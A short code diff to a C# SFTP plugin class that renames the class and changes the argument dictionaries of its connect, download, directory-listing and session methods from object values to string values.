@@ -18,7 +18,7 @@ namespace Plugins
     }
 
 
-    public class Plugin : AthenaPlugin
+    public class Sftp : AthenaPlugin
     {
         public override string Name => "sftp";
         SftpClient client { get; set; }
@@ -27,7 +27,7 @@ namespace Plugins
 
         Dictionary<string, SftpSession> sessions = new Dictionary<string, SftpSession>();
         string currentSession = "";
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             try
             {
@@ -106,7 +106,7 @@ namespace Plugins
                 return;
             }
         }
-        ResponseResult DownloadFile(Dictionary<string, object> args)
+        ResponseResult DownloadFile(Dictionary<string, string> args)
         {
             if (string.IsNullOrEmpty(currentSession))
             {
@@ -171,7 +171,7 @@ namespace Plugins
             }
         }
 
-        ResponseResult Connect(Dictionary<string, object> args)
+        ResponseResult Connect(Dictionary<string, string> args)
         {
             ConnectionInfo connectionInfo;
             string hostname = (string)args["hostname"];
@@ -242,7 +242,7 @@ namespace Plugins
                 };
             }
         }
-        ResponseResult Disconnect(Dictionary<string, object> args)
+        ResponseResult Disconnect(Dictionary<string, string> args)
         {
             string session;
             if (String.IsNullOrEmpty((string)args["session"]))
@@ -298,7 +298,7 @@ namespace Plugins
                 };
             }
         }
-        FileBrowserResponseResult ListDirectories(Dictionary<string, object> args)
+        FileBrowserResponseResult ListDirectories(Dictionary<string, string> args)
         {
             FileBrowserResponseResult fb = new FileBrowserResponseResult();
             List<FileBrowserFile> directoryFiles = new List<FileBrowserFile>();
@@ -403,7 +403,7 @@ namespace Plugins
                 },
             };
         }
-        ResponseResult ListSessions(Dictionary<string, object> args)
+        ResponseResult ListSessions(Dictionary<string, string> args)
         {
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("Active Sessions");
@@ -427,7 +427,7 @@ namespace Plugins
                 completed = "true",
             };
         }
-        ResponseResult ChangeDirectory(Dictionary<string, object> args)
+        ResponseResult ChangeDirectory(Dictionary<string, string> args)
         {
             if (string.IsNullOrEmpty(currentSession))
             {
@@ -458,7 +458,7 @@ namespace Plugins
                 completed = "true",
             };
         }
-        ResponseResult GetCurrentDirectory(Dictionary<string, object> args)
+        ResponseResult GetCurrentDirectory(Dictionary<string, string> args)
         {
             if (string.IsNullOrEmpty(currentSession))
             {
